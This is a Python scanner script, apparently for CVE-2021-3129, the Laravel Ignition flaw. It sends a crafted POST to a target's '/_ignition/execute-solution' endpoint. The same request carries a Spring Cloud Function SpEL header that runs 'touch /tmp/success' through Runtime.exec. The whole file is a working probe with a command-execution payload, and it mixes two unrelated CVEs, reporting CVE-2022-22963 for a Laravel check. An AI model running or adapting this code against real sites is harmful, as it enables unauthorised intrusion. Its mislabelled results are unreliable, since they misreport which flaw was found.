# -*- coding: utf-8 -*-
# @Time : 2023/4/14 14:58
# @Author : Administrator
# @Email : 2069282793@qq.com
# @File : CVE-2021-3129.py
# @Project : pythonProject
# @脚本说明 :
import requests


class CVE_2021_3129:
    def __init__(self):
        with open('../opt/前端传url.txt', 'r') as file:
            self.url = file.readline()     # 获取前端传入url
        self.payload = self.url + "/_ignition/execute-solution"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/97.0.4692.71 Safari/537.36",
            "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",
            "Content-Type": "application/json"
        }
        self.json = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "qwer",
                "viewFile": "qwert"
            }
        }

    def post(self):
        try:
            res = requests.post(url=self.payload, headers=self.headers, json=self.json)
            txt = res.text
            payload = "file_get_contents(qwert): failed to open stream: No such file or directory in file"
            if payload in txt:
                a = "存在CVE-2022-22963漏洞"
                print(a)
                return a
        except:
            pass


cv = CVE_2021_3129()
cv.post()
